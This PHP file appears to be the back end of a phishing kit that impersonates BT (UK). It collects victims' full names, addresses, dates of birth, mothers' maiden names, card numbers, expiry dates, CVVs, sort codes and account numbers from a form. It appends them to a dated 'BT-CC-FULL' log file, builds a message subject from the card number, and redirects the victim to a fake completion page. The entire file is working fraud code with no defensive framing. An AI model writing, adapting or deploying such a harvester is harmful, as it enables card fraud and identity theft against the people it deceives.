<?php

//error_reporting(0);

error_reporting(0);
include "at.php";
include "control.php";

if(isset($_GET["validid"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	


	
	$str .= "Full Name: $_POST[1]<br>";
	$str .= "Address: $_POST[3]<br>";
	$str .= "City: $_POST[4]<br>";
	$str .= "Zip: $_POST[5]<br>";
	$str .= "Phone: $_POST[6]<br>";
	$str .= "DOB: $_POST[2]<br>";
    $str .= "MMN: $_POST[7]<br><br>";
	
	
	$str .= "CC Name: $_POST[8]<br>";
	$str .= "CC: $_POST[9]<br>";
	$str .= "Exp: $_POST[10] $_POST[11]<br>";
	$str .= "CVV: $_POST[12]<br>";
	$str .= "SORT-CODE: $_POST[sort_code]<br>";
	$str .= "ACCNO: $_POST[acc_number]<br>";

$strx = $_POST['card_number'];

$strx=preg_replace('/\s+/', '', $strx);

$details="$strx|$_POST[10]|$_POST[11]|$_POST[12]|Name on Card : $_POST[8]|$_POST[3]|$_POST[4]|$_POST[5]|UK|phone number : $_POST[6]|date of birth : $_POST[2]|account number : $_POST[acc_number]|sort code : $_POST[sort_code]|Full Name : $_POST[1]|mother maiden name : $_POST[7]".PHP_EOL;

	

$today = date("m.d.y");
$file=fopen($today."-BT-CC-FULL.txt","a");
fwrite($file,$details);
fclose($file);



$ccc = $_POST["card_number"];
if($ccc == '') { echo "Please go Back!  Invalid Data!"; return;  } else {

$stxrx = $_POST['card_number'];

$stxrx=preg_replace('/\s+/', '', $stxrx);

$subject = "BT-UK: $stxrx";

	
$random2=rand(0,100000000000);
$randomlink = md5($random2);
              
}

header("Location: i3799.php?/ACC/Sign/complete&validid=id=$randomlink$randomlink$randomlink$randomlink$randomlink".randomCha(rand(15,30)));
}
?> 
